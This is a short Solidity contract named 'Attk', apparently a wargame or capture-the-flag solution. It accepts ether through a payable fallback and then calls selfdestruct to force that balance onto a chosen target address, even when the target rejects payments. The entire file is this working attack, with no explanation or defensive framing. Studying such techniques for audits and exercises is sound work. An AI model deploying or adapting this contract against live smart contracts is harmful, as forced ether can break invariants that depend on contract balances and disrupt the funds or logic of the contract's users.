pragma solidity ^0.8.0;
contract Attk {
    address payable target;
    constructor(address payable _target) {
        target = _target;
    }
    fallback() external payable {}

    function end() external {
        selfdestruct(target);
    }
}  
